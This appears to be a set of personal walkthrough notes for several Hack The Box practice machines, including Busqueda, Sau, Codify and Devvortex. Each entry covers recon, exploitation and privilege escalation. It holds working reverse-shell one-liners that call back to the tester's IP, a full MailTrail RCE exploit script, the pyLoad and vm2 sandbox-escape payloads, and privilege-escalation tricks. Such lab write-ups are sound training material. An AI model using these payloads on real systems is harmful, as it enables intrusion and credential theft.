# Easy\_machines

## MonitorsTwo

1. Observe opened ports
   * `sudo nmap <ip>`
     * 22/tcp open ssh
     * 80/tcp open http
2. Observe website (http is open)
   * URL = 10.10.11.211
     * login screen
     * Cacti version 1.2.22
       * search for the vulns
         * CVE-2022-46169 (https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
3. Exploit the CVE-2022-46169 vuln
   * download the exploit script
     * `git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22`
   * `nc -nlvp 443`
   * `python3 CVE-2022-46169.py -u http://<ip> --LHOST=<local_IP> --LPORT=443`
     * LHOST can be obtained with `ifconfig` -> tun0 IP
   * explore the reverse shelled connection
     * `whoami` `ls -l /`
     * `ls -la /`
       * we can see the file ".dockerenv" -> we are inside Docker container
     *   `cat entrypoint.sh`

         > mysql --host=db --user=root --password=root cacti -e "show tables"
     * `mysql --host=db --user=root --password=root cacti -e "show tables"`

## Busqueda

1. Reco `sudo nmap -sVC 10.10.11.208`
   * sudo nano /etc/hosts
     * 10.10.11.208 searcher.htb
2. Weaponisation App is running Searchor v2.4.0 which has vuln ![](https://hackmd.io/\_uploads/S1qlltUqh.png)
3. Exploitation

* as a search value, insert RS inside it:
  * `nc -nlvp 4444`
  * `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"')#`

4. User flag
   * cd
   * cat user.txt
5.  Root flag

    ![](https://hackmd.io/\_uploads/HkC\_MK8qn.png)

    * UN: cody
    * PW: jh1usoih2bkjaspwe92

* SSH connect
  * ssh svc@10.10.11.208
    * PW: jh1usoih2bkjaspwe92
  * we can edit the python script file
    * ![](https://hackmd.io/\_uploads/SyKJVFIqn.png)
* PE
  * [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
    * `import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`
  * cd
    * `nano full-checkup.sh`
      * ![](https://hackmd.io/\_uploads/HyyBHKLq3.png)

```
#!/usr/bin/python3
import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```

* `chmod +x full-checkup.sh`
  * LOCAL machine: `nc -nlvp <port>`
  * `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

![](https://hackmd.io/\_uploads/S13UdFU9h.png)

## MonitorsTwo

1. Reco
   * `sudo nmap -sVC 10.10.11.211 -Pn`
   * website on 10.10.11.211
2. Weaponisation

* running Cacti v1.2.22 - [VULN](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) - exploit allows through an RCE to obtain RS

3. Exploitation

* `nc -nlvp <port>`
* `python3 CVE-2022-46169.py -u http://<MACHINE_IP> --LHOST=<LOCAL_IP> --LPORT=<PORT>`
* we are inside www-data
  * cd
  * ls -la
    * there is an "entrypoint.sh" file
      * cat entrypoint.sh ![](https://hackmd.io/\_uploads/H1H3v98qh.png)
        * MySQL credentials
  * cd /var/www/html
    * cat cacti.sql
      * login credentials ![](https://hackmd.io/\_uploads/ryqNccI92.png)
        * admin, guest
          * but not much helpful
  * there is "linpeas.sh" file
    * after run it shows that /sbin/capsh is vuln
      * [VULN](https://gtfobins.github.io/gtfobins/capsh/#suid)
        * go to the /sbin folder
          * `./capsh --gid=0 --uid=0 --`
          * `mysql — host-db — user=root cacti -e “SELECT * FROM user_auth”`
            * user marcus with hash PW
              * crack PW with john or hashcat
              * `hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --sho`
                * marcus:funkymonkey

4. User flag
   * ssh marcus@10.10.11.211
     * PW: funkymonkey ![](https://hackmd.io/\_uploads/rylmhqIc3.png)
5. Root flag
   * cat /var/mail/marcus
     * ![](https://hackmd.io/\_uploads/SJ6faqIq2.png)
   * Docker version
     * ![](https://hackmd.io/\_uploads/BJbh2qU92.png)
     * [VULN](https://github.com/UncleJ4ck/CVE-2021-41091)
   * upload the CVE exploit to the marcus ssh
   * LOCAL machine:
     * git clone https://github.com/UncleJ4ck/CVE-2021-41091
     * cd CVE-2021-41091
     * chmod +x ./exp.sh
     * python3 -m http.server 80
   * marcus:
     * wget http://\<LOCAL\_IP>/exp.sh ![](https://hackmd.io/\_uploads/BJxElo8q3.png)
     * chmod +x exp.sh
     * ./exp.sh
       * yes
     * cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
     * ./bin/bash -p
       * NOTHING HAPPENS even after restarting machine
         * cant obtain root flag...

## PC

1. Reco

* `nmap -sVC 10.10.11.214 -Pn -p-`
  * 22 SSH
  * 50051 gRPC channel
    * [TOOL](https://github.com/fullstorydev/grpcui)

2. Weaponisation
   * grpcui -plaintext 10.10.11.214:50051
   * ![](https://hackmd.io/\_uploads/HyzIFj8c3.png)
     * admin:admin
       * obtained token
3. Exploitation - run it in burpsuite - save the request as "sqli.req" - sqlmap -r sqli.req --dump ![](https://hackmd.io/\_uploads/SJH3ti853.png) - admin:admin - sau:HereIsYourPassWord1431
4. User flag
   * ssh sau@10.10.11.214
     * PW: HereIsYourPassWord1431
   * ls
   * cat user.txt
5. Root flag
   * PE
     * nothing useful using linpeas.sh
       * cd
         * netstat -nltp
       * BUT running port 8000, service pyLoad
         * [VULN](https://github.com/bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad)
     * `ssh -L 8888:127.0.0.1:8000 sau@10.10.11.214`
       * access URL: 127.0.0.1:8888
         * ![](https://hackmd.io/\_uploads/Hkva3iI9n.png)
     * pyload --version
       * pyLoad 0.5.0
         * [CVE](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)

> ```
>                 - curl -i -s -k -X $'POST' \
> -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
> --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
> $'http://127.0.0.1:8000/flash/addcrypted2'
> ```

* [Exploit Code](https://github.com/bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad)
  * edit it for our purpose curl -i -s -k -X $'POST'\
    \--data-binary $'jk=pyimport%20os;os.system("Bash%20/dev/shm/rev.sh");f=function%20f2(){};\&package=xxx\&crypted=AAAA&\&passwords=aaaa'\
    $'http://127.0.0.1:8000/flash/addcrypted2'
* on SAU:
  * cd /dev
    * cd shm
      * nano rev.sh
        * ![](https://hackmd.io/\_uploads/SkYEyhUc2.png)
      * chmod +x rev.sh
      * ./rev.sh
      * ![](https://hackmd.io/\_uploads/rylOE2Iq3.png)
* on LOCAL machine:
  * `nc -nlvp 4444`
  * boom, we are in
    * cd
    * cat root.txt

## Topology

1. Reco
   * `nmap -sVC 10.10.11.217 -Pn -p-`
     * 22 and 80 open
   * website
     * Gobuster found nothing
     * there is a link to LaTex Equation Generator
2. Weaponisation - HTPASSWD exploit - `$\lstinputlisting{/var/www/dev/.htpasswd}$` - ![](https://hackmd.io/\_uploads/rkeYInIq3.png)
3. Exploitation
   * we obtained login credentials with hashed PW
     * hash-identifier -> md5
       * decrypt it to obtain PW
         * vdaisley@topology.htb:calculus20
4. User flag
   * ssh vdaisley@10.10.11.217
     * PW: calculus20
   * ls
   * cat user.txt
5. Root flag
   * while searching the dirs in user, there is gnuplot in /opt dir
     * ![](https://hackmd.io/\_uploads/rkJWO2Ucn.png)
     * gnuplot uses plt files - we can use it for pspy86 exploitation
       * lets create http server, upload a file containing exploit inside the machine to obtain root privileges
   * LOCAL machine:
     * download pspy64 exploit
     * python -m http.server
   * TARGET machine:
     * wget \<LOCAL\_IP>:8000/pspy64
     * echo "system "chmod u+s"" > /opt/gnuplot/test.plt
     * cat /opt/gnuplot/test.plt
     * ls -la /opt/gnuplot/test.plt
     * bash -p
     * whoami
     * cd root
       * cat root.txt

## Sau

### Reco

#### nmap

`nmap -sVC 10.10.11.224`

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

* 22 SSH
* 80 HTTP (filtered)
* 55555 unknown - probably HTTP, because it accepts GET requests

#### Website

* by results of nmap scan: -p 55555 is open
* lets check the URL: http://10.10.11.224:55555

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption><p>Website on port 55555</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption><p>Footer of the website</p></figcaption></figure>

### Weaponisation

request-baskets v 1.2.1

* version is vuln to SSRF (Server Side Request Forgery)
* [https://notes.sjtu.edu.cn/s/MUUhEymt7](https://notes.sjtu.edu.cn/s/MUUhEymt7)
* our goal is to use request-baskets service which is running on -p 55555 to perform a GET request to the port 80

### Exploitation

#### Create a basket

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption><p>new basket "test"</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption><p>header - Configuration Settings</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption><p>Configuration according the the exploit</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption><p>Service running on -p80 is MAILTRAIL v0.53</p></figcaption></figure>

* Mailtrail v0.53 VULN
  * lets find a vuln to prepare a PoC (proof-of-concept)
  * RCE (Remote Code Execution)

#### Payload

\#!/bin/python3&#x20;

import sys import os import base64

\#Arguments to be passed

**YOUR\_IP** = sys.argv\[1]

**YOUR\_PORT** = sys.argv\[2]&#x20;

**TARGET\_URL** = sys.argv\[3]

print("\n\[+]Started MailTrail version 0.53 Exploit")

\#Fail-safe for arguments

if len(sys.argv) != 4: print("Usage: python3 mailtrail.py ") sys.exit(-1)

\#Exploit the vulnerbility

def exploit(my\_ip, my\_port, target\_url): # Defining python3 reverse shell payload payload = f'python3 -c 'import socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("{my\_ip}",{my\_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' # Encoding the payload with base64 encoding encoded\_payload = base64.b64encode(payload.encode()).decode() # curl command that is to be executed on our system to exploit mailtrail command = f"curl '{target\_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'" # Executing it os.system(command)

print("\n\[+]Exploiting MailTrail on {}".format(str(TARGET\_URL))) try: exploit(YOUR\_IP, YOUR\_PORT, TARGET\_URL) print("\n\[+] Successfully Exploited") print("\n\[+] Check your Reverse Shell Listener") except: print("\n\[!] An Error has occured. Try again!")

### User flag

#### Reverse Shell

`nc -nlvp 4444`

`python3 <script_file> <YOUR_IP> <PORT> <TARGET_URL>`&#x20;

`python3 exploit.py 10.10.14.7 4444 http://10.10.11.224:55555/test`

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption><p>Reverse Shell obtained</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption><p>Path to user flag (/home/puma/user.txt)</p></figcaption></figure>

### Root flag

* Check executable commands

`sudo -l`

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption><p>systemctl status trail.service</p></figcaption></figure>

* run the possible command

`sudo systemctl status trail.service`

`!sh`

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

`cd /root`

`cat root.txt`

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

## Keeper

### Reco

* nmap ![](https://hackmd.io/\_uploads/SygLzvjn2.png)
  * 22 SSH
  * 80 HTTP without a redirect
* website
  * ![](https://hackmd.io/\_uploads/H1-lXPihh.png)
    * this tells us to add the URl into redirects to be able to connect to the website
      * /etc/hosts -> `tickets.keeper.htb`
        * ![](https://hackmd.io/\_uploads/SJCHNvsn2.png)
  * website login accessed: ![](https://hackmd.io/\_uploads/S19u4vs3n.png)

### Weaponisation

* website is running this one:
  * Best Practical Request Tracker (RT) 4.4.4
    * outdated, little bit of finding to obtain default login credentials:
      * `root:password`
        * [Source](https://wiki.gentoo.org/wiki/Request\_Tracker) ![](https://hackmd.io/\_uploads/H1w8Hws3n.png)
* after login
  * there is one ticket with history ![](https://hackmd.io/\_uploads/HJY1UDj33.png)
    * The attachment has been removed...
    * But there's also mention of another user named `lnorgaard`

### Exploitation

* When we use the `Admin panel to view all Users`, there's a password located within the user's comments
  * access admin -> users ![](https://hackmd.io/\_uploads/SyrpDvon3.png)
  * select the user ![](https://hackmd.io/\_uploads/B1ckOwjhh.png)
  * obtain SSH login credentials ![](https://hackmd.io/\_uploads/rkRSYPjh3.png)

### User flag

* SSH login w found login creds
  * lnorgaard@10.10.11.227
    * PW: `Welcome2023!`
* ls
* cat user.txt

### Root flag

* ls ![](https://hackmd.io/\_uploads/SyHncvj23.png)
  * KeePassDumpFull.dmp
    * there is a CVE foor KeePassDump from 2023
      * [Exploit to obtain PW from dmp](https://sysdig.com/blog/keepass-cve-2023-32784-detection/)
      * [PoC](https://github.com/vdohney/keepass-password-dumper)
* [pokracovani](https://github.com/rouvinerh/Gitbook/blob/main/writeups/htb-season-2/keeper.md)

## Codify

### Reco

* nmap -sVC 10.10.11.239 -Pn
  * 22 SSH
  * 80 HTTP (Apache httpd 2.4.52)
    * redirect http://codify.htb/
      * add to /etc/hosts
  * 3000 HTTP (Node.js Express FW)
* dirb http://codify.htb/ /usr/share/wordlists/dirb/common.txt
  * /about 200
  * /editor 200
  * /server-status 403
  * /limitations 200
* subpage /about
  * mention about backend JS library for running Sandbox
    * vm2
      * (CVE-2023-29017)\[https://github.com/advisories/GHSA-ch3r-j5x3-6q2m]
        * CVSS score 9.8
        * hacker could use it to escape the sandbox and execute arbitrary code
      * allows partial code exec on isolated Node.js servers while securing system resources and externam data from unauthorized access

### Weaponisation

### Exploitation

const {VM} = require("vm2"); const vm = new VM();

const code = `aVM2_INTERNAL_TMPNAME = {}; function stack() { new Error().stack; stack(); } try { stack(); } catch (a$tmpname) { a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd'); }`

console.log(vm.run(code));

* OUTPUT:
  * /etc/passwd list
* execSync('cd /home && ls')
  * users: joshua, svc
* execSync('cd /var/www/contact && cat index.js');
  * secret: 'G3U9SHG29S872HA028DH278D9178D90A782GH
* execSync('cd /var/www/contact && cat tickets.db');
  * joshua credentials w hash
    * joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
      * hashcat -a 0 -m 3200 hash.txt /home/zihuatanejo/Desktop/rockyou.txt -w 3
        * PW: spongebob1

### User flag

* ssh joshua@10.10.11.239
  * PW: spongebob1
  * ls && cat user.txt

### Root flag

* cd /opt/scripts && ls
  * cat mysql-backup.sh
    * vuln backup script from mysql DB asking for root PW
* python script for guessing PW char by char, trying to sudo the db.sh file

***

import string import subprocess all = list(string.ascii\_letters + string.digits) password = "" found = False

while not found: for character in all: command = f"echo '{password}{character}\*' | sudo /opt/scripts/mysql-backup.sh" output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

```
    if "Password confirmed!" in output:
        password += character
        print(password)
        break
else:
    found = True
```

***

* python3 script.py
  * PW: kljh12k3jhaskjh12kjh3
* sudo /opt/scripts/mysql-backup.sh
  * PW
  * _Changing the permissions...Done!_
* su root
  * PW
  * cd /root && ls
  * cat root.txt

## Devvortex

### Reco

#### nmap

* `nmap -sVC 10.10.11.242`
  * 22 SSH
  * 80 HTTP

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

* add to hosts
  * `sudo nano /etc/hosts`

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

* dirb
  * `dirb http://devvortex.htb/ /usr/share/wordlists/dirb/common.txt`
    * nothing interesting found
* subdomains enumeration
  *   `gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

      * found **dev**.devvortex.htb

      <figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
  * another bruteforce tool
  * `ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -mc 200-299`

#### Website

* &#x20;Portfolio website about offering dev services
* Interacting parts
  * /contact.html -> contact form
  * &#x20;footer -> newsletter&#x20;

#### Dev website

* robots.txt

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### Weaponisation

#### administrator

*   dev.devvortex.htb/administrator

    * running Joomla

    <figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>



#### joomscan

*   `joomscan -u dev.devvortex.htb -ec`

    * robots.txt existing
    * admin page /administrator
    * **Joomla 4.2.6**

    <figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

### Exploitation

* Joomla 4.2.6
  * **CVE-2023-23752**

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

*   [Exploit](https://github.com/Acceis/exploit-CVE-2023-23752)

    * Joomla versions 4.0.0-4.2.7 contain an improper API access vuln
      * **vuln allows us access to webservice endpoint which contain sensitive information**
    * sudo gem install httpx
    * sudo gem install paint
    * sudo gem install docopt
    * ruby exploit.rb http://dev.devvortex.htb
      * found users & DB credentials

    <figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>



#### Database

* login w creds
  * lewis:P4ntherg0t1n5r3c0n##

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### User flag

* SSH login doesnt work
* lets search the admin interface
*   we can **upload reverse shell php file...**

    * **SYSTEM -> Templates -> Administrator Templates**

    <figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>



    * error.php

    <figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

    * [Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
      *

          <figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>



          * change IP & port to your own values

<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

* Save
* Start netcat listener
  * `nc -nlvp 4444`

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

* visit error.php&#x20;
  * [http://dev.devvortex.htb/administrator/templates/atum/error.php](http://dev.devvortex.htb/administrator/templates/atum/error.php)
  * BOOM, we have reverse shell

<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

* `python3 -c "import pty;pty.spawn('/bin/bash')"`
* we dont have permissions to read user flag...

<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

* we have to login via SSH as logan, lets find the PW
  * `mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##`
  * show tables;
    * sd4fg\_users table...
      * select \* from sd4fg\_users

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

* users found:
  * lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
  * **logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12**
* decrypt PW using johntheripper
  * nano hash.txt
    * insert the hash ($2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12)
  * `john hash.txt /home/zihuatanejo/Desktop/rockyou.txt`
  * `hashcat -m 3200 hash.txt /home/zihuatanejo/Desktop/rockyou.txt`
    * PW found: **tequieromucho**

<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

* SSH login to logan
  * `ssh logan@10.10.11.242`
    * PW: tequieromucho
  * cat user.txt

<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

### Root flag

* `sudo -l`

<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

* we can run /usr/bin/apport.cli
* apport-cli -v
  * 2.20.11
* [VULN](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) -> /var/crash/xxx.crash
  * lets create some .crash file...
  * Linux saves crash reports into /var/crash dir...we just need to get to pager
    * create a crash file
      * ```
        sleep 13 & killall -SIGSEGV sleep
        ```

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

* cd /var/crash
* ls
*   `sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash`

    * `Please Choose (S/V/K/I/C):`` `**`V`**
    * **after obtaining :**
      * **`!/bin/bash`**
        * BOOM, we have root privileges

    <figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>


* cd /root&#x20;
* cat root.txt

**PWNED <3**

